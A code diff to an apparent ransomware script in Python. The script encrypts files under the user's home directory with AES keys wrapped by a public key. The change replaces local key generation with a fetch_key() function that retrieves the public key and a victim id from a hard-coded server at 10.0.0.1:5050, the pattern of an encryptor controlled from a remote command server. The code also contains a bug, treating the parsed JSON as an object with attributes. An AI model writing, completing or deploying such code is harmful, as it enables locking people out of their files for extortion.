@@ -3,11 +3,13 @@ from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding as sym_padding
-from os import path, listdir
+from os import path
+import requests
 import os
-from keygen import generate_keys
 from message import create_message
 
+SERVER="10.0.0.1"
+PORT="5050"
 
 def encrypt_file(file_path, public_key):
     # Generate a new AES key and IV
@@ -63,9 +65,24 @@ def encrypt_directory(directory_path, public_key_pem_path):
             print(f"Encrypted {file_path}")
 
 
+def fetch_key():
+    url = f'http://{SERVER}:{PORT}/publickey'
+
+    # Send a GET request
+    response = requests.get(url)
+
+    # Check if the request was successful
+    if response.status_code == 200:
+        # Parse JSON from the response
+        data = response.json()
+        print(data)
+        return data.publickey, data.id
+    else:
+        print(f'Failed to retrieve data: status code {response.status_code}')
+
 def main():
     # Example usage
-    generate_keys()  # Run once to generate keys
+    public_key, id = fetch_key()  # Run once to generate keys
     home_dir = os.path.expanduser('~')
 
     # Directories to target
